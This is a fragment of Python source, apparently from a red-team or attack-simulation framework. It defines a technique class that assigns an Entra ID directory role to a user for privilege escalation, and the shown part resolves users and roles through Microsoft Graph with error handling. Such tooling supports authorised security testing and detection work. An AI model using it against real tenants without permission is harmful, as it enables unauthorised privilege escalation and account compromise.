...
class EntraAssignDirectoryRole(BaseTechnique):
    def __init__(self):
        ...
        super().__init__(
            ...
            "Assign a directory role to a user to perform privilege escalation",
            mitre_techniques,
        )
    ...
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        ...
        try:
            ...
            # Get user info
            if not GraphRequest().check_guid(user_id):
                # Get user guid if upn provided in input
                user_string = user_id
                user_endpoint_url = "https://graph.microsoft.com/v1.0/users"
                params = {"$filter": f"userPrincipalName eq '{user_string}'"}

                user_recon_response = GraphRequest().get(
                    user_endpoint_url, params=params
                )
                if "error" in user_recon_response:
                    ...
                    return ExecutionStatus.FAILURE, {
                        "error": {
                            ...
                            "error_detail": user_recon_response.get("error").get(
                                "message"
                            ),
                        },
            ...
            # get role info
            if not GraphRequest().check_guid(role_id):
                # get role guid if role name provided in input
                role_string = role_id
                role_endpoint_url = "https://graph.microsoft.com/v1.0/directoryRoles"
                params = {"$filter": f"displayName eq '{role_string}'"}

                role_recon_response = GraphRequest().get(
                    role_endpoint_url, params=params
                )
                if "error" in role_recon_response:
                    ...
                    return ExecutionStatus.FAILURE, {
                        "error": {
                            ...
                            "error_detail": role_recon_response.get("error").get(
                                "message"
                            ),
                        },
                ...
                if "error" in role_recon_response:
                    ...
                    if "error" in role_recon_response:
                        ...
                        return ExecutionStatus.FAILURE, {
                            "error": {
                                "error_code": role_recon_response.get("error").get(
                                    "code"
                                ),
                                "error_detail": role_recon_response.get("error").get(
                                    "message"
